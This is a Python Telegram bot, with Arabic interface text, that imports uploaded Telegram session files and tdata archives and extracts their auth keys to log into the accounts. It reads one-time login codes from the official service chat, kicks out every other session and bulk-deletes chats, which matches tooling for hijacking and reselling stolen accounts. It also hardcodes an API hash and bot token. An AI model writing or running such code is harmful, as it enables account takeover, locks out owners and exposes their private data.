import os
import re
import sys
import time
import sqlite3
import zipfile
import shutil
import asyncio
import base64
import struct
import traceback
import logging

# =========================================================
# 🚨 رادار الأخطاء (كاشف الأعطال الصامتة والمستقبلية) 🚨
# =========================================================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

def radar_exception_handler(exctype, value, tb):
    logging.critical("\n" + "="*50)
    logging.critical("🚨 [رادار الأعطال] تم اكتشاف انهيار مخفي في البوت!")
    logging.critical("السبب المباشر:")
    logging.critical("".join(traceback.format_exception(exctype, value, tb)))
    logging.critical("="*50 + "\n")

# ربط الرادار بالبنية التحتية لبايثون
sys.excepthook = radar_exception_handler

# =========================================================
# 🛠️ ترقيعة بايثون 3.14 (حل مشكلة الـ Event Loop)
# =========================================================
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())


import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client
from pyrogram.enums import ChatType
from pyrogram.errors import FloodWait, AuthKeyUnregistered, SessionRevoked
from telethon.sessions import StringSession
from telethon.crypto import AuthKey

# --- المتغيرات ---
API_ID = 28797361  
API_HASH = "771041b32e83ab232e066b7adeee700b"  
BOT_TOKEN = "8971197244:AAEBSUdjMuKWs7U1qHfU042gGFYhbkn5HVU"  # ⚠️ ضع التوكن هنا

bot = telebot.TeleBot(BOT_TOKEN)

# --- قاعدة البيانات ---
def init_db():
    conn = sqlite3.connect('accounts.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions 
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, phone TEXT, user_id INTEGER, 
                 first_name TEXT, pyro_session TEXT, tl_session TEXT, session_type TEXT, stars INTEGER)''')
    conn.commit()
    conn.close()

def save_account(owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars):
    conn = sqlite3.connect('accounts.db')
    c = conn.cursor()
    c.execute("INSERT INTO sessions (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
              (owner_id, phone, user_id, first_name, pyro_session, tl_session, session_type, stars))
    conn.commit()
    conn.close()

def get_all_accounts(owner_id):
    conn = sqlite3.connect('accounts.db')
    c = conn.cursor()
    c.execute("SELECT id, phone, first_name, stars FROM sessions WHERE owner_id=?", (owner_id,))
    rows = c.fetchall()
    conn.close()
    return rows

def get_account(acc_id):
    conn = sqlite3.connect('accounts.db')
    c = conn.cursor()
    c.execute("SELECT * FROM sessions WHERE id=?", (acc_id,))
    row = c.fetchone()
    conn.close()
    return row

def delete_account(acc_id):
    conn = sqlite3.connect('accounts.db')
    c = conn.cursor()
    c.execute("DELETE FROM sessions WHERE id=?", (acc_id,))
    conn.commit()
    conn.close()

init_db()

# --- دوال الأعلام ---
COUNTRY_FLAGS = {
    "+964": ("🇮🇶", "العراق"), "+966": ("🇸🇦", "السعودية"), "+971": ("🇦🇪", "الإمارات"),
    "+965": ("🇰🇼", "الكويت"), "+974": ("🇶🇦", "قطر"), "+973": ("🇧🇭", "البحرين"), 
    "+968": ("🇴🇲", "عُمان"), "+20": ("🇪🇬", "مصر"), "+212": ("🇲🇦", "المغرب"), 
    "+213": ("🇩🇿", "الجزائر"), "+216": ("🇹🇳", "تونس"), "+218": ("🇱🇾", "ليبيا"), 
    "+249": ("🇸🇩", "السودان"), "+967": ("🇾🇪", "اليمن"), "+962": ("🇯🇴", "الأردن"), 
    "+961": ("🇱🇧", "لبنان"), "+963": ("🇸🇾", "سوريا")
}

def get_country_info(phone):
    if not phone: return "🏳️", "غير معروف"
    for prefix, (flag, name) in COUNTRY_FLAGS.items():
        if phone.startswith(prefix):
            return flag, name
    return "🏳️", "غير معروف"

# --- واجهة الأزرار الخاصة بـ Telebot ---
def home_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("✉️ جلب الكود", callback_data="req_code"),
               InlineKeyboardButton("🕵️ كشف الحسابات", callback_data="reveal_accounts"))
    markup.row(InlineKeyboardButton("💀 إنهاء الجلسات الأخرى", callback_data="menu_terminate"),
               InlineKeyboardButton("🧹 التنظيف الشامل", callback_data="menu_clean"))
    markup.row(InlineKeyboardButton("🚪 تسجيل الخروج", callback_data="menu_logout"))
    markup.row(InlineKeyboardButton("📂 إضافة حساب", callback_data="add_account"))
    return markup

def accounts_action_keyboard(owner_id, action):
    accounts = get_all_accounts(owner_id)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 الجميع", callback_data=f"act_{action}_all"))
    for acc_id, phone, name, stars in accounts:
        markup.row(InlineKeyboardButton(f"{phone} | {name} | ⭐ {stars}", callback_data=f"act_{action}_{acc_id}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
    return markup

# --- أوامر البوت الأساسية ---
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.reply_to(
        message,
        "**🤖 أهلاً بك في بوت إدارة الحسابات الاحترافي!**\n\n"
        "يدعم إضافة الحسابات عبر (ZIP - TDATA - Session).\n"
        "يمكنك إرسال عدة ملفات دفعة واحدة وسيتم إضافتها جميعاً.\n\n"
        "**حساباتك في أمان تام.**",
        reply_markup=home_keyboard(),
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "back_home")
def back_home(call):
    bot.edit_message_text(
        "**🤖 القائمة الرئيسية:**",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=home_keyboard(),
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "add_account")
def add_account_prompt(call):
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
    bot.edit_message_text(
        "**📤 إرسال النسخة المُلصقة!**\n\n"
        "أرسل ملفات الـ ZIP أو الـ Session الآن:\n"
        "🔹 إذا كان TDATA: المجلد `D877F783D5D3EF8C` والملفات `key_datas` يجب أن تكون داخل الـ ZIP.",
        call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "reveal_accounts")
def reveal_accounts(call):
    accounts = get_all_accounts(call.from_user.id)
    if not accounts:
        return bot.answer_callback_query(call.id, "لا توجد حسابات!", show_alert=True)
    
    text = "**🕵️ الحسابات المسجلة لديك:**\n\n"
    for acc_id, phone, name, stars in accounts:
        text += f"👤 الاسم: `{name}` | 📱 الرقم: `{phone}` | ⭐ النجوم: `{stars}`\n"
    
    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

# --- نظام جلب الكود ---
@bot.callback_query_handler(func=lambda call: call.data == "req_code")
def request_code(call):
    msg = bot.send_message(call.message.chat.id, "**📥 أرسل رقم الحساب المراد جلب الكود له الآن:**\n\n*(مثال: +9647700000000)*", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_code_request)

def process_code_request(message):
    target_phone = message.text.strip().replace(" ", "")
    user_id = message.from_user.id
    accounts = get_all_accounts(user_id)
    
    target_acc = next((get_account(acc[0]) for acc in accounts if acc[1] == target_phone), None)
    if not target_acc:
        return bot.send_message(message.chat.id, "❌ هذا الرقم غير موجود في حساباتك المضافة.", reply_markup=home_keyboard())

    status_msg = bot.send_message(message.chat.id, "⏳ جاري البحث عن الكود...")
    
    try:
        code_found, err = asyncio.run(fetch_code_async(target_acc[5], user_id))
        
        if code_found:
            flag, country = get_country_info(target_phone)
            bot.edit_message_text(
                f"🌎 **Country:** {flag} {country}\n📱 **Service:** 📱\n🔢 **Number:** `{target_phone}`\n🔑 **OTP:** `{code_found}`",
                message.chat.id, status_msg.message_id, parse_mode="Markdown"
            )
        elif err:
            bot.edit_message_text(f"❌ خطأ: {err}", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
        else:
            bot.edit_message_text("❌ لم أجد أي كود حالي في رسائل هذا الحساب.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
    except Exception as e:
        logging.error(f"Error fetching code: {e}")
        bot.edit_message_text("❌ تعذر جلب الكود حالياً بسبب خطأ داخلي.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())

async def fetch_code_async(pyro_session, user_id):
    exec_client = Client(f"code_{user_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    try:
        await exec_client.connect()
        code_found = None
        async for msg in exec_client.get_chat_history(777000, limit=10):
            if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                match = re.search(r'\b(\d{5})\b', msg.text)
                if match: code_found = match.group(1); break
        await exec_client.disconnect()
        return code_found, None
    except (AuthKeyUnregistered, SessionRevoked):
        return None, "الجلسة باطلة أو محظورة."
    except Exception as e:
        return None, str(e)

# --- قوائم الإجراءات ---
@bot.callback_query_handler(func=lambda call: re.match(r"^menu_(terminate|clean|logout)$", call.data))
def action_menus(call):
    action = call.data.split("_")[1]
    titles = {
        "terminate": "💀 **إنهاء الجلسات الأخرى:**\nاختر حساباً لحذف جميع جلساته:",
        "clean": "🧹 **التنظيف الشامل:**\nاختر حساباً لحذف جميع المحادثات:",
        "logout": "🚪 **تسجيل الخروج:**\nاختر حساباً لتسجيل خروجه:"
    }
    bot.edit_message_text(titles[action], call.message.chat.id, call.message.message_id, reply_markup=accounts_action_keyboard(call.from_user.id, action), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: re.match(r"^act_(terminate|clean|logout)_(all|\d+)$", call.data))
def execute_action(call):
    data = call.data.split("_")
    action, target = data[1], data[2]
    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ...")
    
    if target == "all":
        accounts = get_all_accounts(call.from_user.id)
        for acc in accounts:
            asyncio.run(perform_action_async(action, acc[0], call.from_user.id))
        bot.edit_message_text(f"✅ **تم تنفيذ الإجراء على جميع الحسابات.**", call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
    else:
        msg = asyncio.run(perform_action_async(action, int(target), call.from_user.id))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")

async def perform_action_async(action, acc_id, owner_id):
    acc = get_account(acc_id)
    if not acc: return "❌ الحساب غير موجود."
    _, _, phone, user_id, first_name, pyro_session, _, _, _ = acc
    
    try:
        exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
        await exec_client.connect()
    except (AuthKeyUnregistered, SessionRevoked):
        delete_account(acc_id)
        return f"❌ الحساب `{phone}` محظور وتم حذفه."
    except:
        return f"❌ فشل الاتصال بـ `{phone}`."

    result_msg = ""
    try:
        if action == "terminate":
            auths = await exec_client.get_authorizations()
            for auth in auths:
                if not auth.is_current:
                    await exec_client.terminate_session(auth.hash)
                    await asyncio.sleep(1)
            result_msg = f"💀 **تم إنهاء الجلسات الأخرى لـ** `{phone}`."

        elif action == "clean":
            async for dialog in exec_client.get_dialogs():
                try:
                    if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                        await exec_client.leave_chat(dialog.chat.id)
                        await asyncio.sleep(0.5)
                    elif dialog.chat.type == ChatType.PRIVATE and not dialog.chat.is_verified:
                        await exec_client.delete_chat_history(dialog.chat.id)
                        await asyncio.sleep(0.5)
                except FloodWait as e: await asyncio.sleep(e.value)
                except: continue
            result_msg = f"🧹 **تم التنظيف الشامل لـ** `{phone}`."

        elif action == "logout":
            await exec_client.log_out()
            delete_account(acc_id)
            result_msg = f"🚪 **تم تسجيل خروج البوت من** `{phone}`."
    except Exception as e: result_msg = f"❌ خطأ: {type(e).__name__}"
    finally:
        if exec_client.is_connected: await exec_client.disconnect()
    return result_msg

# --- استخراج الحسابات ---
def get_dc_ip(dc_id):
    ips = {1: "149.154.175.53", 2: "149.154.167.51", 3: "149.154.175.100", 4: "149.154.167.90", 5: "149.154.171.5"}
    return ips.get(dc_id, "149.154.167.51")

def generate_sessions(api_id, dc_id, auth_key_bytes):
    pyro_packed = struct.pack(">B?256sQ", dc_id, False, auth_key_bytes, 9999)
    pyro_session = base64.urlsafe_b64encode(pyro_packed).decode("utf-8").rstrip("=")
    session = StringSession()
    session._dc_id, session._server_address, session.port, session._auth_key = dc_id, get_dc_ip(dc_id), 443, AuthKey(auth_key_bytes)
    return pyro_session, session.save()

def extract_auth_pure(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            try:
                conn = sqlite3.connect(os.path.join(root, file))
                c = conn.cursor()
                c.execute("SELECT name FROM sqlite_master WHERE type='table'")
                tables = [r[0] for r in c.fetchall()]
                if 'dc' in tables:
                    row = c.execute("SELECT dc_id, auth_key FROM dc WHERE length(auth_key) = 256 LIMIT 1").fetchone()
                    if row: conn.close(); return row[0], row[1]
                if 'sessions' in tables:
                    row = c.execute("SELECT dc_id, auth_key FROM sessions WHERE length(auth_key) = 256 LIMIT 1").fetchone()
                    if row: conn.close(); return row[0], row[1]
                conn.close()
            except: continue
    raise Exception("Auth key not found.")

def extract_string_from_txt(dir_path):
    for root, _, files in os.walk(dir_path):
        for file in files:
            if file.endswith(".txt"):
                with open(os.path.join(root, file), 'r') as f: content = f.read().strip()
                try:
                    data = base64.urlsafe_b64decode(content + "=" * (-len(content) % 4))
                    if len(data) == 261: return struct.unpack(">B", data[0:1])[0], data[5:261]
                except: pass
                try:
                    sess = StringSession(content)
                    if sess._dc_id and sess._auth_key: return sess._dc_id, sess._auth_key.key
                except: pass
    return None, None

async def verify_and_save_async(owner_id, dc_id, auth_key, stype):
    pyro_session, tl_session = generate_sessions(API_ID, dc_id, auth_key)
    client = Client(f"verify_{owner_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
    await client.connect()
    me = await client.get_me()
    phone, first_name = me.phone_number or "Unknown", me.first_name or "User"
    try:
        from pyrogram.raw.functions.payments import GetStarsStatus
        res = await client.invoke(GetStarsStatus(peer=await client.resolve_peer("me")))
        stars = getattr(res, "balance", 0)
    except: stars = 0
    await client.disconnect()
    save_account(owner_id, phone, me.id, first_name, pyro_session, tl_session, stype, stars)
    return phone, first_name, stars

# --- استقبال الملفات ---
@bot.message_handler(content_types=['document'])
def handle_files(message):
    file_name = message.document.file_name
    if not file_name.endswith((".zip", ".session", ".txt")): return
    
    status_msg = bot.reply_to(message, "⏳ جاري المعالجة...")
    
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    extract_dir = f"tmp_{message.from_user.id}_{message.message_id}"
    os.makedirs(extract_dir, exist_ok=True)
    local_path = os.path.join(extract_dir, file_name)
    
    with open(local_path, 'wb') as new_file:
        new_file.write(downloaded_file)

    results = []
    try:
        if file_name.endswith(".zip"):
            with zipfile.ZipFile(local_path, 'r') as zip_ref: zip_ref.extractall(extract_dir)
            try:
                dc_id, auth_key = extract_auth_pure(extract_dir)
                p, n, s = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, "TDATA/ZIP"))
                results.append(f"✅ {p} ({n}) ⭐ {s}")
            except:
                dc_id, auth_key = extract_string_from_txt(extract_dir)
                if dc_id:
                    p, n, s = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, "TXT ZIP"))
                    results.append(f"✅ {p} ({n}) ⭐ {s}")

        elif file_name.endswith(".session"):
            try:
                dc_id, auth_key = extract_auth_pure(extract_dir)
                p, n, s = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, "Session File"))
                results.append(f"✅ {p} ({n}) ⭐ {s}")
            except: pass

        elif file_name.endswith(".txt"):
            dc_id, auth_key = extract_string_from_txt(extract_dir)
            if dc_id:
                p, n, s = asyncio.run(verify_and_save_async(message.from_user.id, dc_id, auth_key, "TXT File"))
                results.append(f"✅ {p} ({n}) ⭐ {s}")

        if results:
            bot.edit_message_text("**تمت الإضافة بنجاح:**\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(), parse_mode="Markdown")
        else:
            bot.edit_message_text("❌ فشل استخراج بيانات صالحة.", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {type(e).__name__}", message.chat.id, status_msg.message_id, reply_markup=home_keyboard())
    finally:
        shutil.rmtree(extract_dir, ignore_errors=True)

# =========================================================
# 🚀 تشغيل البوت مع التخطي والمقاومة
# =========================================================
if __name__ == "__main__":
    logging.info("🚀 جاري إطلاق البوت وتشغيل الرادار...")
    while True:
        try:
            bot.infinity_polling(skip_pending=True, timeout=10, long_polling_timeout=5)
        except Exception as e:
            logging.error(f"⚠️ تم قطع الاتصال: {e} .. إعادة المحاولة خلال 3 ثواني")
            time.sleep(3)